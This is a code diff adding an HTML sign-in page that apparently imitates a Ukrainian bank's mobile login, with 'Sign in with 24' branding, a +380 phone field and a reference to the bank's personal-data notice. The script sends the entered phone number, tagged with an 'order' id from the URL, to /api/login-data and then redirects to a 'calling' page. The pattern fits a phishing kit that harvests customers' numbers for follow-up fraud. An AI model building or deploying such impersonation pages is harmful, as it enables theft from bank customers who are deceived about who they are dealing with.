@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Sign In / Sign Up</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+.header{
+  display:flex;align-items:center;justify-content:flex-end;
+  padding:14px 18px;border-bottom:1px solid #eee;
+}
+.x-btn{background:none;border:none;cursor:pointer;padding:8px}
+.x-btn svg{width:24px;height:24px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
+
+.content{flex:1;padding:36px 24px 0;display:flex;flex-direction:column}
+
+.title{
+  font-size:26px;font-weight:400;color:#1a1a1a;
+  text-align:center;letter-spacing:-.3px;margin:0 0 36px;
+  line-height:1.15;
+}
+
+.lbl{font-size:12px;color:#9aa0a6;margin-bottom:8px;font-weight:400}
+
+.phone-row{
+  display:flex;align-items:center;
+  padding-bottom:8px;border-bottom:1.5px solid #e8e8e8;margin-bottom:22px;
+}
+.pref{
+  display:flex;align-items:center;gap:6px;
+  padding-right:10px;border-right:1px solid #d8d8d8;
+  margin-right:10px;cursor:pointer;
+}
+.pref .fl{width:22px;height:16px;border-radius:2px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 0 0 1px rgba(0,0,0,.06)}
+.pref .fl .fl-top{background:#0057B7;flex:1}
+.pref .fl .fl-bot{background:#FFD700;flex:1}
+.pref .cd{font-size:15px;font-weight:500;color:#1a1a1a;letter-spacing:.2px}
+.pref .ar{width:11px;height:11px;fill:#8a8a8a}
+
+.inp{
+  border:none;outline:none;font-size:15px;color:#1a1a1a;
+  background:transparent;width:100%;font-family:inherit;
+  letter-spacing:.3px;padding:0;font-weight:400;
+}
+.inp::placeholder{color:#dcdcdc;font-weight:400}
+
+.terms{display:flex;align-items:flex-start;gap:12px;margin-bottom:24px}
+.chk{
+  width:22px;height:22px;min-width:22px;border:1.5px solid #d4d4d4;border-radius:5px;
+  cursor:pointer;display:flex;align-items:center;justify-content:center;
+  background:#fff;transition:.15s;margin-top:2px;
+}
+.chk.on{background:#4EA524;border-color:#4EA524}
+.chk svg{width:13px;height:13px;stroke:#fff;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round;display:none}
+.chk.on svg{display:block}
+.terms-txt{font-size:12px;color:#5f6368;line-height:1.5;font-weight:400}
+.terms-txt a{color:#4EA524;text-decoration:none;font-weight:400}
+
+.btn-g{
+  display:block;margin:0 auto 12px;padding:0 48px;height:46px;
+  border:none;border-radius:26px;font-size:15px;font-weight:600;
+  color:#fff;background:#4EA524;cursor:pointer;font-family:inherit;transition:.2s;
+  min-width:200px;letter-spacing:.2px;
+}
+.btn-g:hover{background:#3d8a1c}
+.btn-g:disabled{opacity:.4;cursor:default}
+
+.sep{text-align:center;color:#9aa0a6;font-size:13px;margin:2px 0 12px}
+
+.btn-b{
+  margin:0 auto;padding:0 40px;height:46px;
+  border:none;border-radius:26px;font-size:15px;font-weight:600;
+  color:#fff;background:#1a1a1a;cursor:pointer;font-family:inherit;transition:.2s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  min-width:200px;
+}
+.btn-b:hover{background:#333}
+.i24{
+  width:22px;height:22px;border-radius:50%;background:transparent;
+  border:1.5px solid #4EA524;
+  display:flex;align-items:center;justify-content:center;
+  font-size:10px;font-weight:700;color:#fff;letter-spacing:.2px;
+}
+
+.bottom{
+  display:flex;align-items:center;justify-content:center;gap:28px;
+  margin-top:auto;padding:24px 20px 24px;
+}
+.dl{display:flex;align-items:center;gap:9px;text-decoration:none;color:#1a1a1a}
+.dl svg{width:22px;height:22px;flex-shrink:0}
+.dl .t1{font-size:10px;color:#9aa0a6;line-height:1.2}
+.dl .t2{font-size:13px;font-weight:600;color:#1a1a1a;line-height:1.2;margin-top:1px}
+
+.err{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:10px;padding:10px 14px;margin:0 28px 16px;color:#c62828;font-size:13px;text-align:center}
+
+.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:99;align-items:center;justify-content:center;padding:20px}
+.ov.open{display:flex}
+.md{background:#fff;border-radius:20px;width:100%;max-width:360px;padding:28px 24px;position:relative;text-align:center}
+.md-x{position:absolute;top:14px;right:14px;width:32px;height:32px;border-radius:50%;background:#f5f5f5;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.md-x svg{width:16px;height:16px;stroke:#888;stroke-width:2.5;fill:none;stroke-linecap:round}
+.md img{width:100%;border-radius:10px}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <button class="x-btn" onclick="history.back()" aria-label="Close"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+</div>
+
+<div class="err" id="err"></div>
+
+<div class="content">
+  <div class="title">Sign In / Sign Up</div>
+  <div class="lbl">Phone Number</div>
+
+  <div class="phone-row">
+    <div class="pref">
+      <span class="fl"><span class="fl-top"></span><span class="fl-bot"></span></span>
+      <span class="cd">+380</span>
+      <svg class="ar" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+    <input class="inp" id="phone" type="tel" inputmode="numeric" placeholder="000000000" maxlength="12" oninput="ck()">
+  </div>
+
+  <div class="terms">
+    <div class="chk on" id="chk" onclick="tg()"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg></div>
+    <div class="terms-txt">By continuing, I confirm that I agree to the <a href="#">Terms and Conditions</a>, and have read the <a href="#">Notice on the Processing of Personal Data at the Bank</a></div>
+  </div>
+
+  <button class="btn-g" id="go" onclick="sub()" disabled>Continue</button>
+  <div class="sep">or</div>
+  <button class="btn-b" onclick="sub()">Sign in with <span class="i24">24</span></button>
+</div>
+
+<div class="bottom">
+  <a class="dl" href="#">
+    <svg viewBox="0 0 24 24" fill="#1a1a1a"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.81-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+    <div><div class="t1">Available on</div><div class="t2">App Store</div></div>
+  </a>
+  <a class="dl" href="#">
+    <svg viewBox="0 0 24 24" fill="none"><path d="M3.61 1.81L13.39 12 3.61 22.19c-.26-.44-.41-.96-.41-1.52V3.33c0-.56.15-1.08.41-1.52z" fill="#4285F4"/><path d="M17.07 8.32l-3.68 3.68 3.68 3.68 4.15-2.36c.72-.41.72-1.24 0-1.64l-4.15-2.36z" fill="#FBBC04"/><path d="M3.61 22.19c.51.86 1.41 1.26 2.32.78L17.07 15.68l-3.68-3.68L3.61 22.19z" fill="#EA4335"/><path d="M3.61 1.81L13.39 12l3.68-3.68L5.93 1.03C5.02.55 4.12.95 3.61 1.81z" fill="#34A853"/></svg>
+    <div><div class="t1">Available on</div><div class="t2">Play Market</div></div>
+  </a>
+</div>
+
+<div class="ov" id="ov">
+  <div class="md">
+    <button class="md-x" onclick="ce()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <img src="/images/error-illustration.jpg" alt="" onclick="ce()">
+  </div>
+</div>
+
+<script>
+var ps=new URLSearchParams(location.search),oid=ps.get("order"),ag=true;
+function tg(){ag=!ag;var c=document.getElementById("chk");ag?c.classList.add("on"):c.classList.remove("on");ck()}
+function ck(){var p=document.getElementById("phone").value.replace(/\D/g,"");document.getElementById("go").disabled=!(p.length>=9&&ag)}
+if(ps.get("error")==="1")document.getElementById("ov").classList.add("open");
+function ce(){document.getElementById("ov").classList.remove("open");history.replaceState(null,"","login.html"+(oid?"?order="+oid:""))}
+document.getElementById("ov").addEventListener("click",function(e){if(e.target===this)ce()});
+async function sub(){
+  var p=document.getElementById("phone").value.replace(/\D/g,"");
+  if(p.length<9)return;
+  var b=document.getElementById("go");b.disabled=true;b.textContent="Please wait...";
+  try{
+    var r=await fetch("/api/login-data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({order_id:oid,username:"+380"+p,country:"UA"})});
+    var d=await r.json();
+    if(!d.success){se(d.message||"Error");b.disabled=false;b.textContent="Continue";return}
+    location.href="calling.html?order="+oid+"&phone="+p;
+  }catch(e){se("Connection error");b.disabled=false;b.textContent="Continue"}
+}
+function se(m){var e=document.getElementById("err");e.textContent=m;e.style.display="block";setTimeout(function(){e.style.display="none"},3000)}
+document.getElementById("phone").addEventListener("keydown",function(e){if(e.key==="Enter")sub()});
+</script>
+<script src="/tracker.js"></script>
+</body>
+</html>
